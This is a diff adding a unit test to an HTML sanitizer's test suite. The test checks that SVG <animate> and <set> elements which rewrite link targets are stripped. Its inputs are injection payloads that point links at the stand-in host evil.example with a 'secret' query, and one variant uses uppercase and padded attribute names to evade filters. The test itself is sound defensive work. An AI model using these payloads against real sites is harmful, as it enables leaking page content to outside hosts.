@@ -54,6 +54,26 @@ describe("sandboxedDocument", () => {
     expect(link?.getAttribute("title")).toBe("https://evil.example/?q=secret");
     expect(doc.querySelector("h1")?.textContent).toBe("Prep notes");
   });
+
+  it("takes out SVG animations that would put a link back once the page is drawn", () => {
+    // A sandboxed frame may still navigate itself, so a link set by an animation could carry
+    // what the page says to another site when it is clicked.
+    const html = sandboxedDocument(
+      [
+        "<p>Report</p><svg>",
+        '<a><animate attributeName="href" values="https://evil.example/?q=secret" /><text>Open</text></a>',
+        '<a><set attributeName="xlink:href" to="https://evil.example/2" /><text>More</text></a>',
+        '<a><SET ATTRIBUTENAME=" HREF " to="https://evil.example/3" /><text>Shout</text></a>',
+        '<rect><animate attributeName="width" from="0" to="10" dur="1s" /></rect>',
+        "</svg>",
+      ].join(""),
+    );
+    expect(html).not.toContain("evil.example");
+    const doc = new DOMParser().parseFromString(html, "text/html");
+    // An animation that changes nothing that leaves stays, and so do the words.
+    expect([...doc.querySelectorAll("*")].filter((n) => n.localName === "animate")).toHaveLength(1);
+    expect(doc.body.textContent).toContain("Open");
+  });
 });
 
 describe("FileViewer", () => {
